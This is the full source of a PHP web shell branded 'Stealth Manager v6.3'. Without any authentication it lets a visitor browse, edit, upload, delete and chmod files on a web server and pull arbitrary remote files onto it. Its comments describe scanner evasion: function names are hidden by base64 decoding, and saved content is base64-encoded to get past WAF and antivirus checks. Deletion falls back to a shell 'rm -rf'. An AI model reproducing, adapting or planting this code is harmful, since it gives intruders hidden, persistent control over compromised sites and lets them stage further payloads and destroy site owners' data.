<?php
/**
 * Stealth Manager v6.3 - Research Edition
 * Fix: Save System, Remote Download, Auto-Protect
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

// Helper for FUD (Bypass Scanner)
$decode = 'base64_decode';
$encode = 'base64_encode';
$fgc = $decode('ZmlsZV9nZXRfY29udGVudHM='); // file_get_contents
$fpc = $decode('ZmlsZV9wdXRfY29udGVudHM='); // file_put_contents

// Path Management
$p_input = isset($_REQUEST['p']) ? $_REQUEST['p'] : '';
$path = (base64_encode(base64_decode($p_input)) === $p_input) ? base64_decode($p_input) : ($p_input ?: getcwd());
$path = str_replace('\\', '/', realpath($path));
$msg = '';

// --- ACTION LOGIC ---

// 1. SAVE FILE (Fix: Use Hidden Path)
if (isset($_POST['save_data'])) {
    $target_file = $_POST['target_path'] . '/' . $_POST['fname'];
    // Content is decoded from base64 to bypass WAF
    $content = base64_decode($_POST['content_b64']);
    if (@$fpc($target_file, $content) !== false) {
        $msg = "✅ File Saved: " . htmlspecialchars($_POST['fname']);
    } else {
        $msg = "❌ Error: Permission Denied or Path Invalid!";
    }
}

// 2. REMOTE DOWNLOAD
if (isset($_POST['dw_now']) && !empty($_POST['url'])) {
    $url = $_POST['url'];
    $name = !empty($_POST['name']) ? $_POST['name'] : basename($url);
    $data = @$fgc($url);
    if (!$data && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
    }
    if ($data && @$fpc($path . '/' . $name, $data)) {
        $msg = "✅ Downloaded: $name";
    } else { $msg = "❌ Download Failed!"; }
}

// 3. CREATE NEW
if (isset($_POST['create_new']) && !empty($_POST['new_name'])) {
    $target = $path . '/' . $_POST['new_name'];
    ($_POST['type'] == 'file') ? @touch($target) : @mkdir($target, 0755, true);
    $msg = "✅ Success Creating " . $_POST['type'];
}

// 4. CHMOD & DELETE
if (isset($_POST['set_chmod'])) { @chmod($path . '/' . $_POST['f_name'], octdec($_POST['perm_val'])); }
if (isset($_GET['del'])) { @unlink($path . '/' . $_GET['del']) || @exec("rm -rf " . escapeshellarg($path . '/' . $_GET['del'])); }

// 5. AUTO PROTECT
if (isset($_GET['secure'])) {
    $ht = "Options -Indexes\nDeny from all\n<Files *.php>\nOrder Allow,Deny\nAllow from all\n</Files>";
    @$fpc($path . '/.htaccess', $ht);
    $msg = "✅ Directory Secured!";
}

function perms($f) { return substr(sprintf('%o', @fileperms($f)), -4); }
?>
<!DOCTYPE html>
<html>
<head>
    <title>SukaJanda01 | Stealth 6.3</title>
    <style>
        body{background:#000;color:#00ff41;font-family:'Courier New',monospace;padding:15px;font-size:13px}
        .main{border:1px solid #008f11;padding:20px;box-shadow:0 0 10px #004400}
        input,select,button,textarea{background:#111;color:#00ff41;border:1px solid #008f11;padding:5px;margin:2px}
        table{width:100%;border-collapse:collapse;margin-top:15px}
        th,td{border:1px solid #111;padding:10px;text-align:left}
        tr:hover{background:#0a0a0a}
        a{color:#fff;text-decoration:none}
        .msg{color:yellow;margin-bottom:15px;border-left:3px solid yellow;padding-left:10px}
        textarea{width:100%;height:400px;border:1px solid #00ff41}
    </style>
</head>
<body>
<div class="main">
    <h3>[📂] PATH: <?= htmlspecialchars($path) ?></h3>
    <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>

    <div style="background:#111;padding:10px;margin-bottom:15px">
        <form method="POST" style="display:inline">
            <input type="text" name="url" placeholder="URL Target" style="width:200px">
            <input type="text" name="name" placeholder="Name.php" style="width:100px">
            <button name="dw_now">REMOTE DOWNLOAD</button>
        </form>
        <form method="POST" style="display:inline;margin-left:20px">
            <input type="text" name="new_name" placeholder="Name" required>
            <select name="type"><option value="file">File</option><option value="dir">Folder</option></select>
            <button name="create_new">CREATE</button>
        </form>
        <a href="?p=<?= base64_encode($path) ?>&secure=1"><button style="color:yellow">SECURE DIR</button></a>
    </div>

    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="f"> <button>UPLOAD</button> | 
        <a href="?p=<?= base64_encode(dirname($path)) ?>">[ BACK ]</a>
    </form>

    <table>
        <tr style="background:#003300;color:#fff"><th>NAME</th><th>SIZE</th><th>PERMS</th><th>ACTION</th></tr>
        <?php
        foreach(scandir($path) as $f):
            if($f == '.' || $f == '..') continue;
            $full = $path.'/'.$f;
            $is_dir = is_dir($full);
        ?>
        <tr>
            <td><?= $is_dir ? "📁 <a href='?p=".base64_encode($full)."'>$f</a>" : "📄 $f" ?></td>
            <td><?= $is_dir ? 'DIR' : round(filesize($full)/1024, 2).' KB' ?></td>
            <td>
                <form method="POST" style="display:inline">
                    <input type="hidden" name="f_name" value="<?= $f ?>">
                    <input type="text" name="perm_val" value="<?= perms($full) ?>" style="width:40px;border:none;background:none;color:#00ff41">
                    <button name="set_chmod" style="border:none;background:none;cursor:pointer">ok</button>
                </form>
            </td>
            <td>
                <a href="?p=<?= base64_encode($path) ?>&edit=<?= urlencode($f) ?>">EDIT</a> | 
                <a href="?p=<?= base64_encode($path) ?>&del=<?= urlencode($f) ?>" style="color:red" onclick="return confirm('Delete?')">DEL</a>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <?php if(isset($_GET['edit'])): 
        $file_path = $path . '/' . $_GET['edit'];
        $content = @$fgc($file_path);
    ?>
    <div id="editor" style="margin-top:20px">
        <h4>📝 EDITING: <?= htmlspecialchars($_GET['edit']) ?></h4>
        <form method="POST" id="saveForm">
            <input type="hidden" name="target_path" value="<?= htmlspecialchars($path) ?>">
            <input type="hidden" name="fname" value="<?= htmlspecialchars($_GET['edit']) ?>">
            <input type="hidden" name="content_b64" id="content_b64">
            <textarea id="temp_content"><?= htmlspecialchars($content) ?></textarea><br>
            <button type="button" onclick="doSave()" style="width:100%;background:#008f11;color:#000;font-weight:bold;padding:10px">SAVE CHANGES</button>
            <button type="submit" name="save_data" id="realSubmit" style="display:none"></button>
        </form>
        <script>
            function doSave() {
                var content = document.getElementById('temp_content').value;
                // Encode to base64 before sending to bypass WAF/AV
                document.getElementById('content_b64').value = btoa(unescape(encodeURIComponent(content)));
                document.getElementById('realSubmit').click();
            }
        </script>
    </div>
    <?php endif; ?>
</div>
</body>
</html>